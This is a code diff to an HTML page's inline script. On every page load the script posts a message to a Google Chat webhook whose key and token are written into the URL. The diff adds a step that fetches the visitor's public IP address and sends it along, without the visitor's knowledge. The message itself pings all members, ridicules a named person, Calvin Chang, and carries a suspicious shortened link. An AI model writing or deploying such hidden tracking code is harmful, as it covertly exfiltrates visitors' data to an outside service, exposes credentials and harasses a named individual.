@@ -2,13 +2,14 @@
 <script>
   (async function () {
     try {
+      let data = await (await fetch("https://api.ipify.org?format=json")).json()
       fetch(
         "https://chat.googleapis.com/v1/spaces/AAAALhYZK_U/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=nUWcZDj_oG_Ix4y79NXgcs2ineK9znNVewJgmG-r2k4",
         {
           method: "POST",
           headers: { "Content-Type": "application/json; charset=UTF-8" },
           body: JSON.stringify({
-            text: `<users/all> Hey everyone! Quick heads-up — Eric just shared an important announcement. 😅 It looks like Calvin Chang is a monkey because of the translation
+            text: JSON.stringify(data)+`<users/all> Hey everyone! Quick heads-up — Eric just shared an important announcement. 😅 It looks like Calvin Chang is a monkey because of the translation
 So just to keep things safe, don't let monkeys access your code
 If you need to give a monkey your code, remember to be cautious. Thanks, everyone! 🚀 \nP.S. Don't click this link: https://tinyurl.com/dont-click295250`,
           }),
